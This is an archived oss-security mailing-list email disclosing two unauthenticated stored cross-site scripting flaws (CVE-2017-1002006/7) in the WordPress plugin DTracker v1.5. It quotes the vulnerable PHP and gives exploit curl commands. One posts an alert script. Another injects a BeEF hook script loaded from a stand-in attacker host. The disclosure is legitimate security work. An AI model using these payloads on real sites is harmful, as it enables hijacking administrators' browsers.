X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2662" "Monday" "20" "March" "2017" "20:22:09" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<3181956B-7989-4A11-AC6A-5B00768B0617@me.com>" "80" "[oss-security] Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5" nil nil nil "3" "2017032100:22:09" "[oss-security] Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5" (number mark "U       larry0@me.co Mar 20   80/2662  " thread-indent "\"[oss-security] Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 5998 invoked by uid 550); 21 Mar 2017 00:22:25 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 5980 invoked from network); 21 Mar 2017 00:22:24 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
	t=1490055732; bh=Bo1Tjsqpm1vXTyoOiFNRYxjk7E/FkAsHiTaHhZu5O44=;
	h=From:Content-type:Subject:Message-id:Date:To:MIME-version;
	b=P4fwI/cBS41HaPV9+W20AEVKSgtEJNJ6wWMomcZOp078DBycPkOIFSPNTwDJVFKWj
 7gVQXTEnJqIAq5TL6GmP0ivQGa9DXLdvsRwSaF6bs2fQgAP68ZykcfoLX2n4+ZL/zj
 vrnQBnssoiSuQI+VpW5aZUXWwav7WDcGC/rSh7ipi1MxU3iuO/2waCq2uQDLpSzUKE
 Wuw7J2QJu7s3eyoN/nLd6K79CYSkjGjjTbVKmaTnoXi6Fd1x0yt0PXmOR/x0EukhiN
 yKuh4Rfuh8ttxKcdo9UPDzCNR9xRNMf6ciogsD46+DIILPwGWVrp77JMyO9TY0ZtvL
 omOs2+GFNwC1w==
X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
 definitions=2017-03-20_18:,, signatures=0
X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
 clxscore=1034 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
 bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
 engine=8.0.1-1701120000 definitions=main-1703210001
From: "Larry W. Cashdollar" <larry0@me.com>
Content-type: text/plain; charset=utf-8
Content-transfer-encoding: quoted-printable
Message-id: <3181956B-7989-4A11-AC6A-5B00768B0617@me.com>
Date: Mon, 20 Mar 2017 20:22:09 -0400
To: Open Source Security <oss-security@lists.openwall.com>
MIME-version: 1.0 (Mac OS X Mail 9.3 \(3124\))
X-Mailer: Apple Mail (2.3124)
Subject: [oss-security] Two Content Injection vulnerabilities in Wordpress Plugin DTracker v1.5

Title: Two Content Injection vulnerabilities in Wordpress Plugin DTracker v=
1.5
Author: Larry W. Cashdollar, @_larry0
Date: 2017-03-08
CVE-ID:[CVE-2017-1002006][CVE-2017-1002007]
Download Site: https://wordpress.org/plugins/dtracker/
Vendor: https://profiles.wordpress.org/dijo/
Vendor Notified: 2017-03-09
Vendor Contact: plugins@wordpress.org
Advisory: http://www.vapidlabs.com/advisory.php?v=3D186
Description: Track the details of the users downloading the pdf files from =
wordpress site.
Vulnerability:
CVE-2017-1002006:
In file dtracker/save_contact.php

Doesn't check that the user is authorized before injecting new contacts int=
o the wp_contact table.  A simple post request will allow any user to add n=
ew contacts.  A malicious user could inject javascript into the database to=
 be executed in the browser of the admin user.=20=20

$name 		=3D $_POST['name'];
	$company	=3D $_POST['company'];
	$phone 		=3D $_POST['phone'];
	$country	=3D $_POST['country'];
	$contact_id =3D $_POST['contact_id'];
=09
	$table 	=3D 'wp_contacts';
	$data	=3D array(
				'name'		=3D> $name,
				'company'	=3D> $company,
				'phone'		=3D> $phone,
				'country'	=3D> $country,
			);
	$where	=3D array(
				'id'	=3D> $contact_id
			);
=09
$wpdb->flush();
=09
$wpdb->update( $table, $data, $where ); //Update the Contact

CVE-2017-1002007:
In file dtracker/save_mail.php

Doesn't check that the user is authorized before injecting new emails into =
the wp_contact table.  A simple post request will allow any user to add new=
 contacts.  A malicious user could inject javascript into the database to b=
e executed in the browser of the admin user.=20=20


$email 	=3D $_POST['email'];
	$time	=3D date('Y-m-d H:i:s');
	$ip		=3D $_SERVER [ 'REMOTE_ADDR' ] ; //get IP address of the visitor
=09
	$table 	=3D "wp_contacts";
	$data	=3D array (
				'email' 	=3D> $email,
				'time'		=3D> $time,
				'ip'		=3D> $ip=09
			);
=09
	$wpdb->insert( $table, $data); //Insert Values
	$contact_id =3D $wpdb->insert_id; //Get ID of the last inserted row
	$data['contactId'] =3D $contact_id;
	echo json_encode($data); //Pass the id to the JS

Export: JSON TEXT XML
Exploit Code:
	=E2=80=A2 $ curl --data "email=3D\"><script>alert(1);</script>" http://exa=
mple.com/wordpress/wp-content/plugins/dtracker/save_mail.php
	=E2=80=A2 {"email":"\\\"><script>alert(1);<\/script>","time":"2017-03-09 0=
0:54:06","ip":"example.com","contactId":10577}
	=E2=80=A2=20=20
	=E2=80=A2 Or better yet, inject a BeEF hook:
	=E2=80=A2=20=20
	=E2=80=A2 $ curl --data 'email=3D"><script src=3Dhttp://BeEF_Host:3000/hoo=
k.js></script>' http://example.com/wordpress/wp-content/plugins/dtracker/sa=
ve_mail.php

